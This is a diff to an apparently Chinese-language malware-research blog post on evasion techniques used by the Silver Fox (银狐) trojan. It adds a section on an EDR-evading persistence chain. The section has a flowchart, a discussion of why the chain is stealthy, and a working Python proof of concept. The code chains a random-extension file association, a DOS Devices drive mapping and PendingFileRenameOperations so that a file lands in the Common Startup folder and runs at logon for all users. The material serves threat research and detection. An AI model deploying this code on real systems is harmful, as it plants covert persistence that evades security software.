@@ -4,6 +4,7 @@ date: 2025-12-15 18:00:00 -0500
 categories: [Research]
 tags: [malware, trojan, silver-fox, winos, apt, malware-analysis, poc]
 description: 列举了一些银狐木马常用对抗杀软/EDR手段以及代码实现.
+mermaid: true
 media_subpath: /assets/img/2025-12-15-silver-fox-poc-2025
 ---
 
@@ -439,3 +440,171 @@ int InvokeCreateSvcRpcMain(char* pExecCmd)
 
 根据腾讯安全的[分析报告](https://www.freebuf.com/articles/vuls/438775.html)，银狐木马在实战中采用了完全相同的对抗手段，通过滥用 WDAC 策略来禁用目标机器上的安全防护软件。
 
+## 文件关联 + DOS 设备重定向 + 延迟移动实现自启动
+
+根据腾讯安全的[分析报告](https://www.freebuf.com/articles/vuls/438775.html)，银狐使用了一个相当隐蔽的持久化技术。其核心思路是利用 Windows 系统启动过程中的几个合法功能组合（File Associations、DOS Devices Redirect、PendingFileRenameOperations），巧妙地绕过常规监控，达到自启动的目的。
+
+为了验证这一机制，我使用 Python 编写了一个快速的概念验证（POC）。
+
+### 攻击流程图
+
+```mermaid
+flowchart TD
+    subgraph Init [首次执行（需管理员权限）]
+        direction TB
+        A[1. 创建 reboot.xxxx 文件]
+        B[2. 注册 .xxxx → sf-demo 关联]
+        C[3. sf-demo\shell\open\command → 本地 python.exe]
+        D[4. 创建 X: → Common Startup 的 DOS Device 映射]
+        E[5. 添加 PendingFileRenameOperations: 文件 → X:\Startup]
+        A --> B --> C --> D --> E
+    end
+
+    Init -->|系统重启| SMSS
+
+    subgraph SMSS [SMSS.exe 处理阶段]
+        direction TB
+        F[1. DOS Devices 映射生效 (X: 指向启动目录)]
+        G[2. PendingFileRenameOperations 执行文件移动]
+        H[3. reboot.xxxx 被移动到公共启动目录]
+        F --> G --> H
+    end
+
+    SMSS -->|用户登录| Trigger
+
+    subgraph Trigger [自启动触发]
+        direction TB
+        I[Explorer 处理启动目录，打开 reboot.xxxx]
+        J[文件关联触发 python.exe reboot.xxxx]
+        K[恶意代码执行]
+        I --> J --> K
+    end
+```
+
+### 具体实现步骤
+
+整个攻击链条设计得非常精巧，主要分为以下几个阶段：
+
+1.  攻击者首先在目标系统上生成一个空文件，文件名固定为 `reboot`，但扩展名是随机生成的四个字母（例如 `reboot.qmtk`）。这个随机扩展名是整个攻击链的关键标识符，系统中不太可能存在对这种扩展名的已有关联。
+
+2.  在注册表 `HKEY_CLASSES_ROOT` 下创建以这个随机扩展名为名的键，将其默认值指向一个自定义的程序标识符 `sf-demo`。随后，为 `sf-demo` 创建完整的 `shell\open\command` 结构，命令内容指向攻击者放置在脚本同目录下的 `python.exe`，并将文件路径作为参数传入。
+    > **目的**：确保系统知道遇到这个随机扩展名的文件时，应该使用指定的 Python 解释器打开。
+
+3.  通过向 `Session Manager` 下的 `DOS Devices` 键写入一个新值，将一个未被使用的盘符（如 `X:`）映射到系统的公共开始菜单 `Programs` 目录。
+    > **注意**：这个映射不会立即生效，而是在下次系统启动时由会话管理器（SMSS）处理。
+
+4.  攻击者将一对路径写入 `PendingFileRenameOperations` 注册表值。源路径是之前创建的那个带随机扩展名的文件，目标路径则使用刚才映射的虚拟盘符加上 `Startup` 子目录（例如 `X:\Startup\reboot.qmtk`）。
+    > **机制**：这个注册表值专门用于记录需要在重启时执行的文件操作（常用于 Windows 更新或驱动安装）。
+
+### 重启后的执行逻辑
+
+当系统重启时，Windows 会话管理器（SMSS.exe）在启动早期阶段开始工作：
+
+1.  首先处理 `DOS Devices` 中的映射关系，使虚拟盘符 `X:` 生效并指向公共启动目录。
+2.  紧接着处理 `PendingFileRenameOperations` 中记录的操作，将恶意文件移动到目标位置。由于虚拟盘符此时已经生效，目标路径能够正确解析，文件最终落入公共启动目录的 `Startup` 子文件夹中。
+3.  用户登录后，Explorer 进程按照正常流程枚举启动目录中的文件并尝试打开它们。当它遇到 `reboot.qmtk` 时，查询注册表找到对应的文件关联，最终启动 Python 解释器执行恶意代码。
+
+### 隐蔽性
+
+这种多阶段的持久化技术相比传统的注册表 Run 键或计划任务，具有显著的隐蔽性：
+
+*   安全软件通常重点监控 `Run` 键、启动文件夹的直接写入等敏感位置。此方法不直接触碰这些位置，而是通过“延迟移动”间接达成目标。且文件移动发生在系统启动早期，此时大多数安全软件的用户态组件尚未加载。
+*   `PendingFileRenameOperations` 和 `DOS Devices` 映射均是 Windows 系统的合法功能。这些操作在日志中看起来像是正常的系统行为（如软件安装或更新），极易被安全分析师忽略。
+*   使用随机扩展名避开了基于文件类型的黑名单检测，同时不会污染常见文件关联（如 `.exe`, `.bat`），降低了被用户意外发现的概率。
+*   使用公共启动目录（Common Startup）意味着恶意代码会在**所有**用户登录时执行，非常适合横向移动或建立稳固据点。
+*   调查人员需要同时理解文件关联、DOS 设备映射和延迟文件操作这三个独立系统的交互关系，才能还原完整的攻击链。单独查看任何一个注册表修改都不具备明显的恶意特征。
+
+### 代码实现
+
+以下是使用 Python 复现该技术的 POC 代码：
+
+```python
+import os
+import random
+import string
+import winreg
+from pathlib import Path
+from ctypes import create_unicode_buffer, windll
+
+def gen_empty_random_ext(dir_path: str | os.PathLike | None = None) -> Path:
+    """生成带有随机扩展名的空文件"""
+    letters = ''.join(random.choice(string.ascii_lowercase) for _ in range(4))
+    base = "reboot"  # 文件名可自定义
+    dirp = Path(dir_path) if dir_path else Path.cwd()
+    dirp.mkdir(parents=True, exist_ok=True)
+    p = dirp / f"{base}.{letters}"
+    p.touch(exist_ok=True)
+    return p
+
+def reg_map_extension_to_sfdemo(ext: str) -> None:
+    """注册文件扩展名关联"""
+    if ext.startswith('.'):
+        ext = ext[1:]
+    if not (len(ext) == 4 and ext.isalpha()):
+        raise ValueError("ext must be a 4-letter alphabetic extension")
+
+    key_path = fr".{ext}"
+    with winreg.CreateKeyEx(winreg.HKEY_CLASSES_ROOT, key_path, 0, winreg.KEY_SET_VALUE) as k:
+        winreg.SetValueEx(k, None, 0, winreg.REG_SZ, "sf-demo")  # (Default) value
+
+def reg_set_sfdemo_open_to_local_python() -> None:
+    """设置关联程序的打开命令"""
+    script_dir = Path(__file__).resolve().parent
+    python_exe = script_dir / "python.exe"
+    if not python_exe.exists():
+        raise FileNotFoundError(f"'python.exe' not found next to this script: {python_exe}")
+
+    cmd = f'"{python_exe}" "%1"'
+    key_path = r"sf-demo\shell\open\command"
+    with winreg.CreateKeyEx(winreg.HKEY_CLASSES_ROOT, key_path, 0, winreg.KEY_SET_VALUE) as k:
+        winreg.SetValueEx(k, None, 0, winreg.REG_SZ, cmd)
+
+def map_drive_to_common_programs(letter: str) -> None:
+    """映射 DOS Device 盘符到公共程序目录"""
+    if not letter:
+        raise ValueError("letter is required")
+    drive = (letter[0].upper() + ":")
+    if not ('A' <= drive[0] <= 'Z'):
+        raise ValueError("letter must be A–Z")
+
+    # 获取 Common Programs 路径 (e.g., C:\ProgramData\Microsoft\Windows\Start Menu\Programs)
+    CSIDL_COMMON_PROGRAMS = 0x0017
+    buf = create_unicode_buffer(260)
+    hr = windll.shell32.SHGetFolderPathW(0, CSIDL_COMMON_PROGRAMS, 0, 0, buf)
+    if hr != 0:
+        raise OSError(f"SHGetFolderPathW failed with HRESULT {hr:#x}")
+    target_path = buf.value
+
+    key_path = r"SYSTEM\CurrentControlSet\Control\Session Manager\DOS Devices"
+    access = winreg.KEY_SET_VALUE | winreg.KEY_WOW64_64KEY
+    with winreg.CreateKeyEx(winreg.HKEY_LOCAL_MACHINE, key_path, 0, access) as k:
+        winreg.SetValueEx(k, drive, 0, winreg.REG_SZ, "\\??\\" + target_path)
+
+def queue_move_to_startup(p: Path, drive_label: str) -> None:
+    """添加 PendingFileRenameOperations 延迟移动操作"""
+    if not isinstance(p, Path):
+        p = Path(p)
+    src_abs = p.resolve(strict=False)
+    
+    d = (drive_label[0].upper() + ":")
+    if not ('A' <= d[0] <= 'Z'):
+        raise ValueError("drive_label must start with A–Z")
+
+    # 构造 PendingFileRenameOperations 所需的源路径和目标路径
+    # 注意：目标路径使用了我们映射的虚拟盘符
+    src = "\\??\\" + str(src_abs)
+    dst = "\\??\\" + f"{d}\\Startup\\{p.name}"
+
+    key_path = r"SYSTEM\CurrentControlSet\Control\Session Manager"
+    access = winreg.KEY_SET_VALUE | winreg.KEY_QUERY_VALUE | winreg.KEY_WOW64_64KEY
+    with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, key_path, 0, access) as k:
+        try:
+            existing, vtype = winreg.QueryValueEx(k, "PendingFileRenameOperations")
+            if vtype != winreg.REG_MULTI_SZ:
+                existing = []
+        except FileNotFoundError:
+            existing = []
+
+        new_list = list(existing) + [src, dst]
+        winreg.SetValueEx(k, "PendingFileRenameOperations", 0, winreg.REG_MULTI_SZ, new_list)
+```
